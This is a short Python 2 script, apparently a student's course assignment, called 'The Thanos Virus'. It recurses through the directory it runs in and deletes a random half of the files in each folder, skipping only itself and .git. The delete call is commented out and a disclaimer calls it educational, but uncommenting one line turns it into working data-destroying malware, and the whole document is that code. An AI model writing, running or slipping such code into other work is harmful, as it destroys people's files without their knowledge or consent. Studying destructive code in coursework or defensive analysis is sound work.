#!/usr/bin/python

#Title:  The Thanos Virus
#Author: Jason Kaip
#CIS 458(01)

#Description: This program deletes half of the files in the entire directory it is ran in.

#Disclaimer: Author does not take responsibility for any damages caused by this
#program. This was made for strictly educational purposes. Use with caution.

#Important: The statement that deletes the files is commented out at first for safety.
#Uncomment the statement if you wish to run the full program- otherwise, the program will
#print out what files it would have deleted.

import os, random

#This method performs a Thanos snap (deletes half of the files) in the directory specified.
def snapFiles(directory, pname):
	pathname = pname
	pathname += directory+"/"


	#File names are put into an array.
	filenames = [name for name in os.listdir(pathname) if os.path.isfile(pathname+name)]
	files = len(filenames)
	
	#Subdirectory names are put into an array.
	directnames = [name for name in os.listdir(pathname) if os.path.isdir(pathname+name)]
	direct = len(directnames)

	#While loop deletes one file at a time until half remain.
	half = files/2
	while half > 0:
		#Randomly chooses file
		ran = random.randint(0,files-1)
		#If statement prevents Thanos from deleting itself
		if filenames[ran] != "thanos.py":
			if os.path.exists(pathname + filenames[ran]):
				print "Removing: " + filenames[ran]
				#####
				#Uncomment the line below if you wish to delete your files
				#os.remove(pathname + filenames[ran])
				#####
				half = half-1
				
	print "Removed half of files from path: " + pathname + "\n"
	
	#Program recursively goes through each subdirectory and repeats the process
	if direct > 0:
		for d in directnames:
			if d != ".git":
				snapFiles(d, pathname)
	else:
		pathname = ""
		
#Thanos snap is performed on main directory
snapFiles('.', "")

#End of Program
